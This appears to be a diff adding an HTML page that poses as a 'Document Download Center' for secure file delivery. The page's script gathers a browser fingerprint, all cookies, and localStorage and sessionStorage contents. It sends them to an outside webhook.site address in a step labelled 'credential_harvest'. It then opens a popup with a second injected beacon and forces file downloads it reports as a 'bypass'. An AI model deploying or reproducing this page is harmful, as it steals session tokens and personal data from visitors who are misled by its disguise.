@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Assessment - Download Handler</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #2d3748;
+            margin-bottom: 12px;
+            font-size: 24px;
+        }
+        .subtitle {
+            color: #718096;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .btn {
+            background: #4299e1;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        .btn:hover {
+            background: #3182ce;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(66, 153, 225, 0.4);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .info {
+            margin-top: 20px;
+            padding: 12px;
+            background: #edf2f7;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #4a5568;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Document Download Center</h1>
+        <p class="subtitle">Secure file delivery system</p>
+        <button class="btn" onclick="initiateDownload()">Download Documents</button>
+        <div class="info" id="status">Preparing secure download...</div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://webhook.site/fd1f8ae0-9538-4102-9012-b6a41bbcfeb7';
+
+        function collectFingerprintData() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                connection: {
+                    effectiveType: navigator.connection?.effectiveType || 'unknown',
+                    downlink: navigator.connection?.downlink || 'unknown',
+                    rtt: navigator.connection?.rtt || 'unknown'
+                },
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                pdfViewerEnabled: navigator.pdfViewerEnabled
+            };
+        }
+
+        function collectSensitiveData() {
+            const data = {
+                cookies: {},
+                localStorage: {},
+                sessionStorage: {},
+                referrer: document.referrer,
+                url: document.location.href,
+                title: document.title
+            };
+
+            try {
+                document.cookie.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) {
+                        data.cookies[name] = value;
+                    }
+                });
+            } catch(e) {}
+
+            try {
+                Object.assign(data.localStorage, localStorage);
+            } catch(e) {}
+
+            try {
+                Object.assign(data.sessionStorage, sessionStorage);
+            } catch(e) {}
+
+            return data;
+        }
+
+        function sendToWebhook(eventType, additionalData = {}) {
+            const fingerprint = collectFingerprintData();
+            const sensitive = collectSensitiveData();
+            
+            const payload = {
+                timestamp: new Date().toISOString(),
+                event: eventType,
+                target: {
+                    domain: document.location.hostname,
+                    path: document.location.pathname,
+                    protocol: document.location.protocol
+                },
+                identity: {
+                    userAgent: navigator.userAgent,
+                    ip_check_via: 'webhook.site'
+                },
+                fingerprint: fingerprint,
+                sensitive_data: sensitive,
+                security_flags: {
+                    secureContext: isSecureContext,
+                    crossOriginIsolated: window.crossOriginIsolated,
+                    hasCredentials: Object.keys(sensitive.cookies).length > 0 || 
+                                   Object.keys(sensitive.localStorage).length > 0
+                },
+                ...additionalData
+            };
+
+            const params = new URLSearchParams();
+            params.append('data', JSON.stringify(payload));
+            
+            const img = new Image();
+            img.src = `${WEBHOOK_URL}?${params.toString()}`;
+            
+            return payload;
+        }
+
+        function downloadFile(filename, content, type = 'text/plain') {
+            const blob = new Blob([content], { type });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }
+
+        function initiateDownload() {
+            document.getElementById('status').textContent = 'Initiating secure download...';
+
+            const exfilData = sendToWebhook('download_initiated', {
+                stage: 'primary',
+                action: 'credential_harvest'
+            });
+
+            downloadFile('document_001.txt', 
+                'CONFIDENTIAL DOCUMENT\n\nThis is a test file for security assessment.\nGenerated: ' + new Date().toISOString()
+            );
+
+            setTimeout(() => {
+                const popup = window.open('', '_blank', 'width=400,height=300');
+                
+                if (popup) {
+                    popup.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head><title>Loading...</title></head>
+                        <body>
+                            <script>
+                                (function() {
+                                    const webhook = '${WEBHOOK_URL}';
+                                    
+                                    const payload = {
+                                        timestamp: new Date().toISOString(),
+                                        event: 'secondary_download_triggered',
+                                        stage: 'bypass_confirmed',
+                                        method: 'popup_injection',
+                                        opener_domain: '${document.location.hostname}',
+                                        has_cookies: document.cookie.length > 0,
+                                        storage_size: {
+                                            local: Object.keys(localStorage).length,
+                                            session: Object.keys(sessionStorage).length
+                                        }
+                                    };
+
+                                    const params = new URLSearchParams();
+                                    params.append('data', JSON.stringify(payload));
+                                    
+                                    const img = new Image();
+                                    img.src = webhook + '?' + params.toString();
+
+                                    const blob = new Blob(['Secondary payload delivered.\\nBypass successful.'], { type: 'text/plain' });
+                                    const url = URL.createObjectURL(blob);
+                                    const a = document.createElement('a');
+                                    a.href = url;
+                                    a.download = 'document_002.txt';
+                                    document.body.appendChild(a);
+                                    a.click();
+                                    document.body.removeChild(a);
+                                    URL.revokeObjectURL(url);
+
+                                    setTimeout(() => { window.close(); }, 2000);
+                                })();
+                            <\/script>
+                        </body>
+                        </html>
+                    `);
+                    popup.document.close();
+                    
+                    document.getElementById('status').textContent = 'Download completed successfully.';
+                } else {
+                    document.getElementById('status').textContent = 'Download blocked by browser.';
+                }
+            }, 800);
+        }
+    </script>
+</body>
+</html>
